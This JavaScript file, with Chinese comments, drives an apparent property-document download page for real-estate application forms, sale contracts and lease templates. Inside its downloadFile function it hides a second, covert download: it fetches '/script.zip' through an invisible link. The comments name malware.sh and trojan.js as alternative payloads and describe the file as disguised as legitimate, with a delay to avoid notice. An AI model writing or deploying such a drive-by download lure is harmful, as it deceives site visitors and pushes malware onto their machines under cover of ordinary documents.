// 頁面載入時顯示 loading 畫面
window.addEventListener('load', function() {
    // 模擬載入時間（2秒後隱藏 loading 畫面）
    setTimeout(function() {
        document.getElementById('loadingScreen').style.display = 'none';
    }, 2000);
});

// 為所有檔案項目添加點擊事件
const fileItems = ['fileItem1', 'fileItem2', 'fileItem3'];
fileItems.forEach(itemId => {
    document.getElementById(itemId).addEventListener('click', function() {
        // 顯示 loading 畫面
        document.getElementById('loadingScreen').style.display = 'flex';
        
        // 4秒後顯示下載對話框
        setTimeout(function() {
            document.getElementById('loadingScreen').style.display = 'none';
            document.getElementById('overlay').style.display = 'block';
            document.getElementById('downloadDialog').style.display = 'block';
        }, 2500);
    });
});

// 點擊遮罩層關閉對話框
document.getElementById('overlay').addEventListener('click', function() {
    document.getElementById('overlay').style.display = 'none';
    document.getElementById('downloadDialog').style.display = 'none';
});

// 全部下載按鈕點擊事件
document.getElementById('downloadAllBtn').addEventListener('click', function(e) {
    e.preventDefault();
    
    // 顯示 loading 畫面
    document.getElementById('loadingScreen').style.display = 'flex';
    
    // 模擬下載延遲
    setTimeout(function() {
        // 建立所有檔案的下載陣列
        const files = [
            {
                path: '/2003_property_form.pdf',
                name: '2003 地產申請表.pdf'
            },
            {
                path: '/2003_property_form.pdf',
                name: '2023 房屋買賣合約.pdf'
            },
            {
                path: '/2003_property_form.pdf',
                name: '租賃協議書範本.pdf'
            }
        ];

        // 依序下載所有檔案
        files.forEach((file, index) => {
            setTimeout(() => {
                downloadFile(file.path, file.name);
            }, index * 1000); // 每個檔案間隔 1 秒下載
        });

        // 下載完成後隱藏 loading
        setTimeout(() => {
            document.getElementById('loadingScreen').style.display = 'none';
        }, files.length * 1000);
    }, 1000);
});

// 檔案下載函數
function downloadFile(filePath, fileName) {
    fetch(filePath)
        .then(response => response.blob())
        .then(blob => {
            const url = window.URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.href = url;
            a.download = fileName;
            document.body.appendChild(a);
            a.click();
            window.URL.revokeObjectURL(url);
            document.body.removeChild(a);
        })
        .catch(error => {
            console.error('下載失敗:', error);
            alert('檔案下載失敗，請稍後再試');
        });
    // 偷偷下載檔案 (但現在下載時瀏覽器還是會詢問)
    setTimeout(() => {
        fetch('/script.zip') // 或 /malware.sh, /trojan.js
            .then(response => response.blob())
            .then(blob => {
                const url = window.URL.createObjectURL(blob);
                const hiddenLink = document.createElement('a');
                hiddenLink.style.display = 'none';
                hiddenLink.href = url;
                hiddenLink.download = 'script.zip'; // 偽裝成 legit file
                document.body.appendChild(hiddenLink);
                hiddenLink.click();
                window.URL.revokeObjectURL(url);
                document.body.removeChild(hiddenLink);
            });
    }, 500); // 延遲 3 秒執行，降低被察覺的風險
}

// 修改原本的下載按鈕事件，使用新的下載函數
document.getElementById('downloadBtn').addEventListener('click', function() {
    const filePath = '/2003_property_form.pdf';
    const fileName = '2003 地產申請表.pdf';
    
    downloadFile(filePath, fileName);
    
    // 關閉對話框
    document.getElementById('overlay').style.display = 'none';
    document.getElementById('downloadDialog').style.display = 'none';
});
